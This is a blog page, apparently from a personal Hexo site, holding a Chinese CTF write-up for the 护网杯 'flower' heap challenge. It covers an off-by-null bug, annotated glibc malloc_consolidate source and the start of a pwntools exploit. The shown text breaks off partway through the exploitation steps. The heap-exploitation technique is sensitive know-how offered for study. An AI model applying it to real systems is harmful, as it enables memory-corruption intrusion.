@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="jcxp">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="jcxp">
+    
+    <meta name="keywords" content="jcxp,hexo-theme,jcxp-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>护网杯 flower Writeup · Jcxp&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Jcxp&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">护网杯 flower Writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Jcxp's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            护网杯 flower Writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.7k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/11</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题存在<code>off-by-null</code>漏洞,但是只能分配<code>fastbin</code>,可以通过触发<code>malloc_consolidate()</code>进行<code>overlapping</code>,然后通过劫持<code>topchunk</code>来<code>getshell</code></p>
+<h2 id="malloc-consolidate-函数分析"><a href="#malloc-consolidate-函数分析" class="headerlink" title="malloc_consolidate()函数分析"></a>malloc_consolidate()函数分析</h2><p>该函数主要有两个功能。  </p>
+<ol>
+<li>检查fastbin是否初始化，如果未初始化，则进行初始化。</li>
+<li>如果fastbin初始化，则按照一定的顺序合并fastbin中的chunk放入unsorted bin中。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//libc-2.28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren't immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">      <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">        malloc_printerr (<span class="string">"malloc_consolidate(): invalid chunk size"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    check_inuse_chunk(av, p);</span><br><span class="line">    nextp = p-&gt;fd;  #按照fd的顺序遍历fastbin   </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">    size = chunksize (p);</span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">    #pre_inuse为<span class="number">0</span>,向前合并</span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;   </span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 下面的chunk不是top_chunk</span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; </span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">      unsorted_bin-&gt;fd = p;</span><br><span class="line">      first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      p-&gt;bk = unsorted_bin;  #将此chunk放到unsoeted bin中</span><br><span class="line">      p-&gt;fd = first_unsorted;</span><br><span class="line">      set_foot(p, size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; #如果下面的chunk是top_chunk，那么久合并到top_chunk</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数的具体步骤如下:  </p>
+<ol>
+<li>判断<code>fastbin</code>是否初始化，如果未初始化，则进行初始化然后退出。</li>
+<li>按照<code>fastbin</code>由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并<code>chunk</code>，每种相同大小的<code>fastbin</code>中<code>chunk</code>的处理顺序是从<code>fastbin-&gt;fd</code>开始取，下一个处理的是<code>p-&gt;fd</code>，依次类推。</li>
+<li>首先尝试合并<code>pre_chunk</code>。</li>
+<li>然后尝试合并<code>next_chunk</code>：如果n<code>ext_chunk</code>是<code>top_chunk</code>，则直接合并到<code>top_chunk</code>，然后进行第六步；如果n<code>ext_chunk</code>不是<code>top_chunk</code>，尝试合并。</li>
+<li>将处理完的<code>chunk</code>插入到<code>unsorted bin</code>头部。</li>
+<li>获取下一个空闲的<code>fastbin</code>，回到第二步，直到清空所有<code>fastbin</code>中的<code>chunk</code>，然后退出。</li>
+</ol>
+<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>在<code>add</code>函数中当chunk长度为<code>88</code>的时候,存在<code>off-by-null</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">_<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name of Size : "</span>, v1);</span><br><span class="line">  v3 = my_read();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0</span> &amp;&amp; v3 &lt;= <span class="number">88</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input index: "</span>);</span><br><span class="line">    v2 = my_read();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">malloc</span>(v3);</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"malloc error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dword_2020A8[<span class="number">4</span> * v2] = v3;</span><br><span class="line">      *((_QWORD *)&amp;unk_2020A0 + <span class="number">2</span> * v2) = v4;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"input flower name:"</span>);</span><br><span class="line">      vul_func(*((_BYTE **)&amp;unk_2020A0 + <span class="number">2</span> * v2), v3);<span class="comment">// off by null</span></span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"error"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//vul_func</span></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">vul_func</span><span class="params">(_BYTE *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">88</span> )</span><br><span class="line">    a1[<span class="number">88</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当只有<code>fastbin</code>时的<code>off-by-null</code>似乎不能利用</p>
+<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>在输入选项时, 通过<code>scanf</code>输入,当输入非常长的字符串时,即使使用<code>setbuf()</code>关闭了输入缓冲区,依然会暂时申请一个<code>large chunk</code>存储输入的字符串.  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_E76();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf((__int64)<span class="string">"%d"</span>, (__int64)&amp;v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        remove();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在分配<code>large chunk</code>之前会调用<code>malloc_consolidate()</code>函数，使得<code>fastbin中的chunk</code>合并，通过这个小技巧我们可以获得<code>unsorted bin</code>.</p>
+<h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><ul>
+<li>首先构造好相应的堆结构 ,这里申请的堆块<code>size</code>小于<code>0x58</code>  ,然后释放掉  </li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">87</span>,<span class="number">0</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">87</span>,<span class="number">1</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">87</span>,<span class="number">2</span>,<span class="string">'cccc'</span>)</span><br><span class="line">add(<span class="number">87</span>,<span class="number">3</span>,<span class="string">'cccc'</span>)</span><br><span class="line">add(<span class="number">87</span>,<span class="number">4</span>,<span class="string">'cccc'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">5</span>,<span class="string">'dddd'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	remove(i)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过<code>scanf</code>触发<code>fastbin</code>合并   </li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">"oice &gt;&gt; \n"</span>,<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时的堆结构如下:  </p>
